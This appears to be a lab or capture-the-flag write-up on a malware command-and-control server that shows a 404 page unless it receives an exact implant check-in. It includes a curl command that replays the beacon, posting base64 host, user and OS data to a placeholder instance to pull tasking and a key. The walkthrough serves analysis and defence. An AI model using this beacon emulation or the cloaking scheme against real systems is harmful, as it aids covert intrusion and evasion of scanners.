The server answers only a check-in that looks exactly like the implant's, and only then tells it where its task is.

1. From the capture (`http.request`, then Follow HTTP stream): `POST /cdn/v3/collect`, `User-Agent: Updater/5.1 (x64; channel=stable)`, `X-Session:` 16 hex digits, and a body that is base64 of `host|user|os` (the `%s|%s|%s` in the strings).
2. The reply: `{"ok":1,"next":"2f63646e...","wait":120}`. `next` is hex for a path, `/cdn/v3/j/<id>`. The path in the capture is the sandbox's; your instance gives its own.
3. `GET` that path with the same User-Agent. Without the check-in first, or with another User-Agent, it is the 404 page.
4. `v` is base64 of the key, reversed: reverse the string, then decode it.

```bash
curl -i -X POST -H 'User-Agent: Updater/5.1 (x64; channel=stable)' -H 'X-Session: 0123456789abcdef' \
     --data "$(printf 'WS-0441|jsmith|Windows 10' | base64)" "https://<instance>/cdn/v3/collect"
```

### What a defender takes from it

A C2 that shows everyone else a plain 404 hides from scanners and sandboxes that do not replay the check-in. Reproducing the check-in from a capture confirms the server is live, and can pull tasking and keys from it during an incident.
